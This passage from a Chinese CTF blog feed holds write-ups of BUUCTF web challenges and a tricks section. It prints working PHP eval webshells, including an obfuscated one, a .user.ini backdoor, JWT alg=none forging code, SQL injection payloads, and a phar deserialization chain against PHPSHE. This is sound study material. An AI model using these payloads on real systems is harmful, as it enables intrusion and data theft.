class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span><br><span class="line">写shell</span><br><span class="line">过滤斜杠/ 可以使用 <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><h2 id="jwt常见漏洞"><a href="#jwt常见漏洞" class="headerlink" title="jwt常见漏洞"></a>jwt常见漏洞</h2><p>JWT由三个部分构成：</p><ul><li>header:存放声明类型type(JWT)，加密算法alg(none,HS256等等)</li><li>荷载：就是存放有效信息(标准中注册的声明，公共声明，私有声明)，一般用来存放需要传递的信息(用户名密码)。</li><li>签名：将头部与荷载的信息base64加密并使用<code>.</code>连接，再通过header中的加密方式与secret组合加密。</li></ul><p>最终完整的JWT是由头部的base64<code>.</code>荷载的base64<code>.</code>与签名的组合。</p><p>无加密算法JWT生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'type'</span>:<span class="string">'jwt'</span>,</span><br><span class="line"><span class="string">'alg'</span>:<span class="string">"none"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'iat'</span>:<span class="number">1587378820</span>,</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'123'</span>,</span><br><span class="line"><span class="string">'secretid'</span>:[]</span><br><span class="line">&#125;</span><br><span class="line">he=json.dumps(headers)</span><br><span class="line">pa=json.dumps(payload)</span><br><span class="line">a=base64.b64encode(he.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">b=base64.b64encode(pa.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a+<span class="string">'.'</span>+b+<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h2><p><img src="G:%5CMyBlog%5Csource_posts%5Cimage%5Cctf%E6%80%BB%E7%BB%93%5Cimage-20201010155236979.png" alt="image-20201010155236979"></p><p>官方手册上说，json_encode支持utf-8编码的数据，那也就是支持unicode编码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF&quot;&gt;&lt;a href=&quot;#CTF&quot; class=&quot;headerlink&quot; title=&quot;CTF&quot;&gt;&lt;/a&gt;CTF&lt;/h1&gt;&lt;h2 id=&quot;md5常见绕过&quot;&gt;&lt;a href=&quot;#md5常见绕过&quot; class=&quot;headerlink&quot; title=&quot;md5常见绕过</summary>
      
    
    
    
    <category term="trick" scheme="http://yoursite.com/categories/trick/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF</title>
    <link href="http://yoursite.com/2019/09/10/BUUCTF/"/>
    <id>http://yoursite.com/2019/09/10/BUUCTF/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2020-10-02T04:55:46.673Z</updated>
    
    <content type="html"><![CDATA[<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>​    是一道文件上传题，首先抓包分析一波，发现&lt;?,php,等都不行，直接上传基本凉凉，于是考虑解析漏洞。</p><p>​    发现题目服务端是nginx，htaccess也不行，在网上看到了一个姿势，<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini构建后门</a> 在这里记录一下用这个姿势的条件</p><p>​    1.上传目录下要有可执行的php文件。</p><p>​    2.服务器使用CGI/FastCGI模式</p><p>​    3.php版本要在5.3.0后</p><p>​    创建user.ini写入</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a  </span><br><span class="line"><span class="attr">auto_prepend_file</span>=test.jpg</span><br></pre></td></tr></table></figure><p>​    于是上传一句话木马,名为test.jpg</p><p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;aa&#39;]);&lt;/script&gt;</code></p><p>​    这样我们的文件就会被包含到同目录中的那个index.php中了，接下来的操作就不说了。</p><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>​    这道题算是我做过的第一道ssti题目，首先发现提示中的render可以知道该题使用tornado模板写的，参考writeup，发现tornado的配置可以放在handler.settings中于是得到payload: <code></code>得到secret_cookie。</p><h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>​    随便注了一下发现基本都被过滤了T_T!<img src="https://i.loli.net/2019/10/10/nqau2sQf315WjHx.png" alt></p><p>​    看了网上的wp，发现这是一道堆叠注入。emmm，这里就不再赘述了，记录一下网上的各种payload</p><p> 方法1：存储过程绕过</p><p>​    1.把关键字编程哈希值绕过                                      </p><p> payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27;<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span>%<span class="number">20</span>execsql%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>@a;<span class="keyword">execute</span>%<span class="number">20</span>execsql;</span><br></pre></td></tr></table></figure><p>​    2.使用concat连接关键字</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>方法2:重命名表名，字段名</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="literal">NULL</span>);<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`tmp`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;</span><br></pre></td></tr></table></figure><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>​    这里涉及MYSQL的一种管道符模式。可以在MYSQL中开启支持管道符来进行字符串的拼接操作。构造payload :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>条件：查询语句中有||。</p><p>​    还有一种payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,2</span><br></pre></td></tr></table></figure><p>​    这种也比较好理解，这样就把查询语句分成了两部分</p><h2 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h2><p>​    方法一：字符串拼接</p><p>​    源码中生成sign是这样一行代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>​    你得到sign是这样的</p><p><img src="https://i.loli.net/2019/10/11/Ku8v9wAXGfrVhU4.png" alt></p><p>​    你只能得到secret_key+param+scan的值。</p><p>​    签名检测代码是这样的</p><p><img src="https://i.loli.net/2019/10/11/IBPZfykxGv8wgdS.png" alt></p><p>​    然后看到exec()里的代码(代码就不帖了)，就可以得到解题方法：用scan来读flag.txt中的值保存到result.txt中，然后用read把它读出来。</p><p>​    所以访问/De1ta，payload:param=flag.txt,通过cookie上传action=readscan,sign的值可以通过访问/getSign上传param=flag.txtread来获得。这样两种sign都是secert_key+flag.txt+readscan，完美的拼接成功拿到flag</p><p>​    方法二：local_file读取文件</p><p>​    先生成已知值：md5(secret_key+local-file:///proc/self/cwd/flag.txt +scan)然后用hashpump生成MD5(secret_key+local-file:///proc/self/cwd/flag.txt +scan+read)的值就行了。</p><p>​    ps:local-file:///proc/self/cwd/代表当前目录，local-file一定要绝对地址。</p><p>这里推荐一个详细的writeup</p><p><a href="https://xz.aliyun.com/t/6050" target="_blank" rel="noopener">SSRFME一题三解</a></p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>​    waf没有过滤load_file，给出了文件地址，直接load_file读取/var/www/flag.php,payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">load_file</span>(<span class="string">'/var/www/flag.php'</span>),<span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以在源码中看到flag</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>​    打开题目是一个登陆页面，随便注册一个登陆。</p><p><img src="https://i.loli.net/2019/11/12/GdEq7NsOHZB5k1V.png" alt></p><p>​    在用户界面有一个重置密码，可能是二次注入。返回注册页面试了一试，发现username和email处存在过滤。首先试一下闭合类型，注册<code>&#39;12&quot;\</code>然后登陆，修改密码发现报错。<img src="C:%5CUsers%5CYCJ%5CAppData%5CLocal%5CTemp%5C1573556029448.png" alt="1573556029448"> </p><p>那这题应该是一个双引号闭合的报错注入。接下来就是爆表,列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x3a),1)#</span><br></pre></td></tr></table></figure><p>发现有个flag表，进去之后没有flag，于是搜一下别的表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x3a),1)#</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/12/l6AOEGLTBkboI8U.png" alt></p><p>发现显示不全，限制一下输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x3a),1)#</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/12/yZRwL21DGMbV5i7.png" alt></p><p>得到列名，这里regexp<a href="https://www.cnblogs.com/yizitrd/p/5441988.html" target="_blank" rel="noopener">是正则表达式函数</a>，这里就不再赘述。接下来爆flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a),1)#</span><br></pre></td></tr></table></figure><p>也是同样显示不全，这里可以用一个reverse函数反向输出一下查到的字符串。然后自己手动拼一下flag就出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,reverse(concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a)),1)#</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h2><p>​    一道框架类的题，对于框架类的题目，不是CVE就是出题人修改了源码制造的漏洞,这题都有。</p><p>​    <img src="https://i.loli.net/2020/06/29/ZsxDktbeq3vWuCH.png" alt></p><p>​    发现是PHPSHE v1.7于是搜了一下有 <a href="https://anquan.baidu.com/article/697" target="_blank" rel="noopener">CVE-2019-9762</a>，分析一下，在common.php中，会对上传的参数的变量名根据上传方式加上前缀。<img src="https://i.loli.net/2020/06/30/F5Q8lX47y9HYsVx.png" alt></p><p>​    利用点是/include/plugin/payment/alipay/pay.php，变量order_id是可控的。<img src="https://i.loli.net/2020/06/30/9Sa4ob1cgT8A5RQ.png" alt></p><p>​    通过get方式上传id，进入pe_dbhold函数，该函数将参数进行addslashes转义处理，然后传入了order_table函数中，该函数将变量用下划线进行截取。</p><p><img src="https://i.loli.net/2020/06/30/QmFKs4gUZD21JoB.png" alt></p><p>​    继续跟进pe_select函数。</p><p><img src="https://i.loli.net/2020/06/30/zqlkxPcbKTwIN21.png" alt></p><p>​    发现order_id作为表名被传入，所以可以控制order_id进行注入。官网包中有phpshe.sql告诉我们数据库配置。</p><p><img src="https://i.loli.net/2020/06/30/GCEvUwnzFQ9oBfl.png" alt></p><p>​    发现admin表中有6个字段，但是字段名都有下划线，所以必须用无列名注入。</p><p>​    payload=pay` where 1=1 union select 1,2,((select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1)),4,5,6,7,8,9,10,11,12%23_</p><p><img src="https://i.loli.net/2020/06/30/25OP1DYu9I7nQNJ.png" alt></p><p>解密得到md5密码。<img src="https://i.loli.net/2020/06/30/O7dVfKuqrgBUYcz.png" alt></p><p>登陆后台发现一处文件上传点，可以上传jpg,txt,zip文件，并可以得到绝对路径。</p><p>​    <img src="https://i.loli.net/2020/06/30/EbpJwPxMe3QuTiy.png" alt></p><p>​    将题目源码和官方源码diff之后发现题目源码pclzip.class.php中多了一个__destruct()类，作用是解压压缩包，所以估计是通过phar反序列化触发。</p><p><img src="https://i.loli.net/2020/06/30/IAzRSyiOEU58WNk.png" alt></p><p>​    于是全局搜索include了pclzip.class.php的类，找到触发点\module\admin\moban.php,    分析一波代码，发现del方法中调用pe_dirdel()方法，跟进发现含有phar触发函数is_file()，而且文件名高度可控，所以思路就出来了，使用phar协议反序列化上传的文件，解压含有shell的压缩包，但是还需要通过pe_token_match()的检验</p><p><img src="https://i.loli.net/2020/06/30/vBT56rAsJlGa7we.png" alt></p><p>​    这个函数作用是检验token和referer值，我们可以看到token是以post或者get方式上传的，通过审查代码，发现token是放在session中的，所以只要session不变token就不会变，之前上传文件的地方也用了token检验，但是并不需要我们提交token，所以猜测token藏在隐藏表单中，果然找到了。至于Referer只要与和网站host保持一致就好了。</p><p><img src="https://i.loli.net/2020/06/30/Zvrm23YJdqWut8j.png" alt></p><p>​    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ----- Filename of the zip file</span></span><br><span class="line">    <span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- File descriptor of the zip file</span></span><br><span class="line">    <span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- Internal error handling</span></span><br><span class="line">    <span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- Current status of the magic_quotes_runtime</span></span><br><span class="line">    <span class="comment">// This value store the php configuration for magic_quotes</span></span><br><span class="line">    <span class="comment">// The class can then disable the magic_quotes and reset it after</span></span><br><span class="line">    <span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line">    <span class="keyword">var</span> $save_path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Function : PclZip()</span></span><br><span class="line">    <span class="comment">// Description :</span></span><br><span class="line">    <span class="comment">//   Creates a PclZip object and set the name of the associated Zip archive</span></span><br><span class="line">    <span class="comment">//   filename.</span></span><br><span class="line">    <span class="comment">//   Note that no real action is taken, if the archive does not exist it is not</span></span><br><span class="line">    <span class="comment">//   created. Use create() for that.</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', "zipname=$p_zipname");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----- Tests the zlib</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----- Set the attributes</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----- Return</span></span><br><span class="line">        <span class="comment">//--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/3.zip"</span>);<span class="comment">//自己上传的zip文件地址</span></span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data'</span>;<span class="comment">//解压缩地址，只要不离谱</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    将文件名和压缩路径改一改，生成phar文件改名txt，上传，触发，上菜刀，/flag一气呵成。</p><p><img src="https://i.loli.net/2020/06/30/KR98yMDgxtCvuIr.png" alt></p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>一打开是一个文件上传页面，随便上传一个马，发现对第六位之后的内容进行了过滤，于是先fuzz一下看哪些可见字符能用。</p><p><img src="https://i.loli.net/2020/07/10/eaT1WB54UohLMRx.png" alt></p><p>能用字符只有~&amp;()_[];，取反能用，因为是上传文件，所以url编码不能用，那思路就是用汉字取反得到shell代码</p><p>在UTF-8编码格式下，一个字符一般占用一个字节，一个汉字一般占用三个字节，取反操作会把数据变成字节流，按位取反，PHP会将取反后的值变成字符串变量，因为而双字节的UTF-8字符二进制一般以11开头，取反之后会比较小，一般是不可见字符，所以第二、三个字节获得可见字符的概率高。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'看'</span>;</span><br><span class="line">$a=(~$a);</span><br><span class="line"><span class="keyword">echo</span> $a[<span class="number">1</span>];</span><br><span class="line"><span class="number">111001111001110010001011</span></span><br><span class="line"><span class="number">00011000</span> <span class="number">01100011</span> <span class="number">01110100</span></span><br><span class="line">  <span class="number">18</span>         c      t</span><br><span class="line"><span class="comment">//输出c</span></span><br></pre></td></tr></table></figure><p>fuzz脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">"园邪够虹努蹄酿日星坚舞化陡管研顷活膛兼真果丸平插上絮辫每剩介海茂冒障柄级未仪肝向俭沿补朽唐报聪尤刘赚妈笼扔碍使叶炎漠洞常致鞭睡雾纠鼻莲桃郊匆欣亚洒贪言岔迎目堡舟裙户屿阿贯灿汉遗租榜愉甜碎泥酱思盼贴镇读"</span>;<span class="comment">//随机字典</span></span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line">$a=<span class="string">'e'</span>;<span class="comment">//想得到的字符</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;mb_strlen($str, <span class="string">'utf-8'</span>);$i++)</span><br><span class="line">&#123;</span><br><span class="line">  $t=mb_substr($str, $i,<span class="number">1</span>, <span class="string">'utf-8'</span>);</span><br><span class="line">  $z=(~$t);</span><br><span class="line">  <span class="keyword">if</span>($z[<span class="number">1</span>]==$a)&#123;</span><br><span class="line">      <span class="keyword">echo</span> $t;</span><br><span class="line">      <span class="keyword">echo</span> $z;</span><br><span class="line">      <span class="keyword">die</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="comment">//目标assert_POST</span></span><br></pre></td></tr></table></figure><p>现在还需要得到1就能得到最终payload了，在PHP中true=1;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$__=[];</span><br><span class="line">$___=[];</span><br><span class="line">$_=$__==$___;<span class="comment">//true=1</span></span><br></pre></td></tr></table></figure><p>现在就可以得到最终的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$__=[];$___=[];$_=$__==$___;$__=(~果);$___=$__[$_];$__=(~化);$___.=$__[$_];$___.=$__[$_];$__=(~障);$___.=$__[$_];$__=(~捷);$___.=$__[$_];$__=(~独);$___.=$__[$_];$__=(~研);$____=$__[$_];$__=(~每);$____.=$__[$_];$__=(~尤);$____.=$__[$_];$__=(~笼);$____.=$__[$_];$__=(~竿);$____.=$__[$_];$_____=$$____;$__=(~研);$___($_____[$__[$_]]);<span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>上传后执行system(‘cat /flag’);获得flag</p><h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>​    file协议被BAN，根据路由判断是flask，从CVE-2019-9948可以得知local_file可以读取本地文件，读取源码<code>local_file///app/app.py</code>。</p><p>​    在/flag路由下获取flag,要求username=fuck，随机数种子设为uuid.getnode()，该方法会使用机器的mac地址作为默认随机数种子。</p><p><code>local_file:///sys/class/net/eth0/address</code>获得随机数种子，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ae00fb24</span>)</span><br><span class="line"><span class="keyword">print</span> str(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure><p>使用flask-cookie工具获得cookie，得到flag。</p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>网图<img src="https://i.loli.net/2020/09/15/vMSC63Nt8bnrqKx.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;  #输出49</span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;  #输出7777777</span><br></pre></td></tr></table></figure><p>测试得到为<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">Twig模板注入</a></p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>​    题目用的call_user_func()，并过滤了很多函数，fuzz一下有啥函数没过率，发现highlight_file，读源码，发现存在反序列化可以绕过WAF。</p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>​    反序列化题，在phpinfo中可以找到flag位置，过滤时存在字符串逃逸，利用extract($_POST)插入非法字符到$_SESSION中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$b[<span class="string">'user'</span>]=<span class="string">"guest"</span>;</span><br><span class="line">$b[<span class="string">'function'</span>]=<span class="string">"show_image"</span>;</span><br><span class="line">$b[<span class="string">'flagflag'</span>]=<span class="string">'";s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";&#125;'</span>;<span class="comment">//d0g3_f1ag.php</span></span><br><span class="line">$b[<span class="string">'img'</span>]=base64_encode(<span class="string">"guest_img.png"</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($b).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> filter(serialize($b));</span><br><span class="line">var_dump(unserialize(filter(serialize($b))));</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>​    